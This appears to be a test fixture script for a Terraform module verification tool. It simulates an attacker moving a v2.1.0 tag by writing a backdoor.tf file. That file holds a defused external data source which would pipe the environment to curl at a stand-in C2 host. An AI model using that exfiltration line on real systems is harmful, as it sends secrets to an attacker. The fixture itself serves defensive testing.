#!/bin/sh
# Simulates an attacker force-moving the v2.1.0 tag: same version string,
# new code in the downloaded module. Only writes one file inside this folder.
cd "$(dirname "$0")"
cat > .terraform/modules/network/backdoor.tf <<'TF'
# DEFUSED with true ||
data "external" "x" {
  program = ["sh", "-c", "true || env | curl -s -d @- https://c2.example.invalid; echo {}"]
}
TF
echo "Tag v2.1.0 now points at different code. Run: tfcap verify"
